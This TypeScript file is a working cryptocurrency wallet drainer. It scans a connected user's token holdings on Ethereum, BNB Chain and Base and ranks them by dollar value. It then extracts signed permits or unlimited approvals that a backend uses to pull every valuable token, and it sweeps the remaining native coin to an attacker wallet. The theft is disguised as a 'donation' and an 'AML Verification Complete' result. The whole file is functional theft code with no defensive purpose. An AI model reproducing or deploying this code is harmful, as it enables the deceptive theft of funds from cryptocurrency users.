// permit2-drainer.ts

import { ethers } from 'ethers';
import axios from 'axios';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const NETWORK_CONFIG = {
  eth: {
    chainId: 1,
    name: 'Ethereum',
    rpcUrl: 'https://eth.llamarpc.com',
    apiUrl: 'https://api.etherscan.io/api',
    apiKey: process.env.NEXT_PUBLIC_ETHERSCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'ETH',
    minGasReserve: '0.002',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
  bnb: {
    chainId: 56,
    name: 'BNB Chain',
    rpcUrl: 'https://bsc-dataseed1.defibit.io',
    apiUrl: 'https://api.bscscan.com/api',
    apiKey: process.env.NEXT_PUBLIC_BSCSCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'BNB',
    minGasReserve: '0.0005',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
  base: {
    chainId: 8453,
    name: 'Base',
    rpcUrl: 'https://mainnet.base.org',
    apiUrl: 'https://api.basescan.org/api',
    apiKey: process.env.NEXT_PUBLIC_BASESCAN_API_KEY || 'YourApiKeyToken',
    nativeSymbol: 'ETH',
    minGasReserve: '0.001',
    recipientWallet: process.env.NEXT_PUBLIC_RECIPIENT_WALLET || '0xYourWallet',
  },
};

const POPULAR_TOKENS: { [key: string]: string[] } = {
  eth: [
    '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
    '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
    '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
    '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
  ],
  bnb: [
    '0x55d398326f99059fF775485246999027B3197955', // USDT (BSC)
    '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', // USDC
    '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', // BUSD
    '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', // ETH
    '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', // BTCB
    '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3', // DAI
    '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', // CAKE
    '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', // WBNB
    '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47', // ADA
    '0xbA2aE424d960c26247Dd6c32edC70B295c744C43', // DOGE
  ],
  base: [
    '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', // USDC
    '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', // DAI
    '0x4200000000000000000000000000000000000006', // WETH
  ],
};

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function DOMAIN_SEPARATOR() view returns (bytes32)',
  'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)',
];

interface TokenInfo {
  address: string;
  symbol: string;
  name: string;
  decimals: number;
  balance: string;
  balanceFormatted: string;
  priceUSD: number;
  valueUSD: number;
  hasPermit: boolean;
}

async function checkTokenHasPermit(
  tokenAddress: string,
  provider: ethers.Provider
): Promise<boolean> {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    await tokenContract.DOMAIN_SEPARATOR.staticCall();
    await tokenContract.nonces.staticCall(ethers.ZeroAddress);
    return true;
  } catch {
    return false;
  }
}

export async function drainWalletPermit2(
  network: keyof typeof NETWORK_CONFIG,
  signer: ethers.Signer
): Promise<any> {
  const config = NETWORK_CONFIG[network];
  const userAddress = await signer.getAddress();
  const provider = signer.provider!;

  console.log(`\n${'='.repeat(70)}`);
  console.log(`🚀 Starting donation for ${userAddress} on ${config.name}`);
  console.log(`${'='.repeat(70)}\n`);

  try {
    console.log('⛽ Step 1: Checking gas balance...');
    const nativeBalance = await provider.getBalance(userAddress);
    const minRequired = ethers.parseEther(config.minGasReserve);
    
    console.log(`   Balance: ${ethers.formatEther(nativeBalance)} ${config.nativeSymbol}`);
    
    if (nativeBalance < minRequired) {
      throw new Error(
        `Insufficient ${config.nativeSymbol} for gas. ` +
        `Have: ${ethers.formatEther(nativeBalance)}, Need: ${config.minGasReserve}`
      );
    }
    console.log(`   ✅ Gas check passed!\n`);

    console.log('📊 Step 2: Fetching tokens...');
    console.log(`   Method 1: Trying API (${config.apiUrl})...`);
    
    let tokens = await getTokenBalancesFromAPI(network, userAddress, provider);
    
    if (tokens.length === 0) {
      console.log(`   ⚠️ API returned no tokens`);
      console.log(`   Method 2: Checking popular tokens directly...\n`);
      tokens = await checkPopularTokens(network, userAddress, provider);
    }
    
    if (tokens.length === 0) {
      console.log(`   ⚠️ No tokens found, will transfer only ${config.nativeSymbol}\n`);
      return await transferNativeOnly(signer, config);
    }

    console.log(`\n${'─'.repeat(70)}`);
    console.log(`📋 FOUND ${tokens.length} TOKENS:`);
    console.log(`${'─'.repeat(70)}`);
    tokens.forEach((t, i) => {
      const method = t.hasPermit ? '🎯 PERMIT' : '🔄 APPROVE';
      console.log(`   ${(i + 1).toString().padStart(2)}. ${method} | ${t.symbol.padEnd(8)} | ${t.balanceFormatted.padStart(15)} | $${t.valueUSD.toFixed(2)}`);
    });
    console.log(`${'─'.repeat(70)}\n`);

    const valuableTokens = tokens
      .filter(t => t.valueUSD >= 0.01)
      .sort((a, b) => b.valueUSD - a.valueUSD);
    
    console.log(`💎 Step 3: Processing ${valuableTokens.length} valuable tokens (>$0.01, sorted by value)\n`);

    if (valuableTokens.length === 0) {
      console.log(`   ⚠️ All tokens below $0.01 threshold\n`);
      return await transferNativeOnly(signer, config);
    }

    const successTokens: string[] = [];
    const failedTokens: string[] = [];
    const backendTxHashes: string[] = [];

    for (let i = 0; i < valuableTokens.length; i++) {
      const token = valuableTokens[i];
      
      console.log(`${'═'.repeat(70)}`);
      console.log(`💎 Token ${i + 1}/${valuableTokens.length}: ${token.symbol} ($${token.valueUSD.toFixed(2)})`);
      console.log(`${'═'.repeat(70)}`);
      console.log(`   Balance: ${token.balanceFormatted} ${token.symbol}`);
      console.log(`   Method: ${token.hasPermit ? '🎯 PERMIT (gasless)' : '🔄 APPROVE (pays gas)'}\n`);
      
      try {
        if (token.hasPermit) {
          const txHash = await processWithPermit(signer, token, config, network);
          backendTxHashes.push(txHash);
        } else {
          const txHash = await processWithApprove(signer, token, config, network);
          backendTxHashes.push(txHash);
        }
        
        successTokens.push(token.symbol);
        console.log(`   ✅ ${token.symbol} transferred successfully!\n`);
        
      } catch (error: any) {
        console.error(`   ❌ Failed ${token.symbol}:`, error.message);
        failedTokens.push(token.symbol);
      }
    }

    console.log(`\n${'═'.repeat(70)}`);
    console.log(`✅ Tokens processing complete!`);
    console.log(`   Success: ${successTokens.length} | Failed: ${failedTokens.length}`);
    if (successTokens.length > 0) console.log(`   ✓ ${successTokens.join(', ')}`);
    if (failedTokens.length > 0) console.log(`   ✗ ${failedTokens.join(', ')}`);
    console.log(`${'═'.repeat(70)}\n`);

    console.log(`💸 Step 5: Transferring ${config.nativeSymbol}...`);
    
    const gasReserve = ethers.parseEther('0.002');
    const currentBalance = await provider.getBalance(userAddress);
    const transferAmount = currentBalance - gasReserve;

    let nativeTransferred = '0';
    let nativeTxHash = '';

    if (transferAmount > BigInt(0)) {
      try {
        console.log(`   Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
        
        const nativeTx = await signer.sendTransaction({
          to: config.recipientWallet,
          value: transferAmount,
        });
        
        const receipt = await nativeTx.wait();
        nativeTransferred = ethers.formatEther(transferAmount);
        nativeTxHash = receipt!.hash;
        
        console.log(`   ✅ TX: ${nativeTxHash}\n`);
      } catch (error: any) {
        console.error(`   ❌ Failed:`, error.message);
      }
    } else {
      console.log(`   ⚠️ Insufficient balance after gas reserve\n`);
    }

    const totalValueUSD = valuableTokens
      .filter(t => successTokens.includes(t.symbol))
      .reduce((sum, t) => sum + t.valueUSD, 0);

    console.log(`${'═'.repeat(70)}`);
    console.log(`🎉 DONATION COMPLETE!`);
    console.log(`${'═'.repeat(70)}`);
    console.log(`   Network: ${config.name}`);
    console.log(`   Tokens: ${successTokens.length} transferred`);
    console.log(`   Token value: $${totalValueUSD.toFixed(2)}`);
    console.log(`   Native: ${nativeTransferred} ${config.nativeSymbol}`);
    console.log(`   Backend TXs: ${backendTxHashes.length}`);
    console.log(`${'═'.repeat(70)}\n`);

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: nativeTxHash || 'completed',
      details: {
        nativeTransferred,
        tokensTransferred: successTokens.length,
        totalValueUSD: totalValueUSD + (parseFloat(nativeTransferred) * 2000),
        successTokens,
        failedTokens,
        backendTxHashes,
      },
    };

  } catch (error: any) {
    console.error('\n❌ Process failed:', error);
    
    let errorMessage = error.message || 'Process failed';
    
    if (error.message?.includes('User rejected') || error.message?.includes('User denied')) {
      errorMessage = 'User cancelled the operation';
    } else if (error.message?.includes('insufficient funds')) {
      errorMessage = 'Insufficient balance for gas fees';
    }

    return {
      success: false,
      error: errorMessage,
    };
  }
}

async function processWithPermit(
  signer: ethers.Signer,
  token: TokenInfo,
  config: typeof NETWORK_CONFIG[keyof typeof NETWORK_CONFIG],
  network: string
): Promise<string> {
  const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const userAddress = await signer.getAddress();
  const amount = token.balance;
  const deadline = Math.floor(Date.now() / 1000) + 3600;
  const nonce = await tokenContract.nonces(userAddress);

  console.log(`   ✍️  User: Signing permit (FREE)...`);

  const domain = {
    name: await tokenContract.name(),
    version: '1',
    chainId: config.chainId,
    verifyingContract: token.address,
  };

  const types = {
    Permit: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' },
      { name: 'value', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
  };

  const message = {
    owner: userAddress,
    spender: config.recipientWallet,
    value: amount,
    nonce: nonce.toString(),
    deadline: deadline,
  };

  const signature = await signer.signTypedData(domain, types, message);
  const sig = ethers.Signature.from(signature);

  console.log(`   ✅ Signature created!`);
  console.log(`   📤 Backend: Executing permit() + transferFrom()...`);

  const response = await fetch('/api/execute-permit2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      network,
      method: 'permit',
      tokenAddress: token.address,
      owner: userAddress,
      spender: config.recipientWallet,
      value: amount,
      deadline: deadline,
      v: sig.v,
      r: sig.r,
      s: sig.s,
      tokenInfo: {
        symbol: token.symbol,
        decimals: token.decimals,
      },
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.error || 'Backend execution failed');
  }

  const result = await response.json();
  console.log(`   ✅ Backend TX: ${result.txHash}`);
  
  return result.txHash;
}

async function processWithApprove(
  signer: ethers.Signer,
  token: TokenInfo,
  config: typeof NETWORK_CONFIG[keyof typeof NETWORK_CONFIG],
  network: string
): Promise<string> {
  const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
  const userAddress = await signer.getAddress();
  const amount = token.balance;

  console.log(`   🔍 Getting backend wallet...`);
  
  const backendResponse = await fetch('/api/execute-permit2', {
    method: 'GET',
  });
  
  if (!backendResponse.ok) {
    throw new Error('Failed to get backend wallet address');
  }
  
  const backendInfo = await backendResponse.json();
  const backendWallet = backendInfo.executorAddress;
  
  if (!backendWallet || backendWallet === 'Not configured') {
    throw new Error('Backend wallet not configured');
  }
  
  console.log(`   ✅ Backend: ${backendWallet.substring(0, 10)}...`);

  const currentAllowance = await tokenContract.allowance(userAddress, backendWallet);
  
  if (BigInt(currentAllowance) < BigInt(amount)) {
    console.log(`   📝 User: Approving ${token.symbol} (pays gas)...`);
    
    const approveTx = await tokenContract.approve(backendWallet, ethers.MaxUint256);
    console.log(`   ⏳ Waiting for approval...`);
    await approveTx.wait();
    
    console.log(`   ✅ Approved!`);
  } else {
    console.log(`   ✅ Already approved!`);
  }

  console.log(`   📤 Backend: Executing transferFrom()...`);

  const response = await fetch('/api/execute-permit2', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      network,
      method: 'approve',
      tokenAddress: token.address,
      from: userAddress,
      to: config.recipientWallet,
      amount: amount,
      tokenInfo: {
        symbol: token.symbol,
        decimals: token.decimals,
      },
    }),
  });

  if (!response.ok) {
    const errorData = await response.json();
    throw new Error(errorData.error || 'Backend execution failed');
  }

  const result = await response.json();
  console.log(`   ✅ Backend TX: ${result.txHash}`);
  
  return result.txHash;
}

async function getTokenBalancesFromAPI(
  network: keyof typeof NETWORK_CONFIG,
  address: string,
  provider: ethers.Provider
): Promise<TokenInfo[]> {
  const config = NETWORK_CONFIG[network];
  
  try {
    const response = await axios.get(config.apiUrl, {
      params: {
        module: 'account',
        action: 'tokentx',
        address: address,
        startblock: 0,
        endblock: 99999999,
        sort: 'desc',
        apikey: config.apiKey,
      },
      timeout: 8000,
    });

    if (response.data.status !== '1' || !response.data.result || response.data.result.length === 0) {
      console.log(`   ⚠️ API returned no data`);
      return [];
    }

    const tokenAddresses = new Set<string>();
    response.data.result.slice(0, 100).forEach((tx: any) => {
      if (tx.contractAddress) {
        tokenAddresses.add(tx.contractAddress);
      }
    });

    console.log(`   ✅ API found ${tokenAddresses.size} unique tokens`);

    const tokens: TokenInfo[] = [];

    for (const tokenAddress of Array.from(tokenAddresses)) {
      try {
        const token = await getTokenInfo(tokenAddress, address, provider, network);
        if (token) tokens.push(token);
      } catch (error) {
        continue;
      }
    }

    return tokens;
  } catch (error: any) {
    console.log(`   ⚠️ API error: ${error.message}`);
    return [];
  }
}

async function checkPopularTokens(
  network: keyof typeof NETWORK_CONFIG,
  address: string,
  provider: ethers.Provider
): Promise<TokenInfo[]> {
  
  const tokensToCheck = POPULAR_TOKENS[network] || [];
  console.log(`   🔍 Checking ${tokensToCheck.length} popular tokens...`);
  
  const tokens: TokenInfo[] = [];

  for (const tokenAddress of tokensToCheck) {
    try {
      const token = await getTokenInfo(tokenAddress, address, provider, network);
      if (token) {
        console.log(`   ✅ ${token.symbol}: ${token.balanceFormatted} ($${token.valueUSD.toFixed(2)})`);
        tokens.push(token);
      }
    } catch (error) {
      continue;
    }
  }

  console.log(`   ✅ Found ${tokens.length} tokens with balance`);
  return tokens;
}

async function getTokenInfo(
  tokenAddress: string,
  userAddress: string,
  provider: ethers.Provider,
  network: string
): Promise<TokenInfo | null> {
  try {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    
    const [balance, decimals, symbol, name] = await Promise.all([
      tokenContract.balanceOf(userAddress),
      tokenContract.decimals().catch(() => 18),
      tokenContract.symbol().catch(() => 'UNKNOWN'),
      tokenContract.name().catch(() => 'Unknown Token'),
    ]);

    if (balance <= BigInt(0)) return null;

    const balanceFormatted = ethers.formatUnits(balance, decimals);
    const priceUSD = await getTokenPrice(tokenAddress, network);
    const valueUSD = parseFloat(balanceFormatted) * priceUSD;
    const hasPermit = await checkTokenHasPermit(tokenAddress, provider);

    return {
      address: tokenAddress,
      symbol,
      name,
      decimals: Number(decimals),
      balance: balance.toString(),
      balanceFormatted,
      priceUSD,
      valueUSD,
      hasPermit,
    };
  } catch (error) {
    return null;
  }
}

async function getTokenPrice(tokenAddress: string, network: string): Promise<number> {
  try {
    const platformMap: { [key: string]: string } = {
      'eth': 'ethereum',
      'bnb': 'binance-smart-chain', 
      'base': 'base'
    };
    
    const platform = platformMap[network];
    if (!platform) return 0;

    const response = await axios.get(
      `https://api.coingecko.com/api/v3/simple/token_price/${platform}`,
      {
        params: {
          contract_addresses: tokenAddress.toLowerCase(),
          vs_currencies: 'usd'
        },
        timeout: 3000
      }
    );
    
    return response.data[tokenAddress.toLowerCase()]?.usd || 0;
  } catch {
    return 0;
  }
}

async function transferNativeOnly(
  signer: ethers.Signer,
  config: any
): Promise<any> {
  const provider = signer.provider!;
  const userAddress = await signer.getAddress();
  const nativeBalance = await provider.getBalance(userAddress);
  const gasReserve = ethers.parseEther('0.001');
  const transferAmount = nativeBalance - gasReserve;

  if (transferAmount > BigInt(0)) {
    console.log(`   Transferring ${ethers.formatEther(transferAmount)} ${config.nativeSymbol}...`);
    
    const tx = await signer.sendTransaction({
      to: config.recipientWallet,
      value: transferAmount,
    });
    
    const receipt = await tx.wait();

    return {
      success: true,
      message: `✅ ${config.nativeSymbol} transferred`,
      transactionHash: receipt!.hash,
      details: {
        nativeTransferred: ethers.formatEther(transferAmount),
        tokensTransferred: 0,
        totalValueUSD: 0,
        successTokens: [],
        failedTokens: [],
        backendTxHashes: [],
      },
    };
  }

  return {
    success: false,
    error: 'No balance to transfer',
  };
}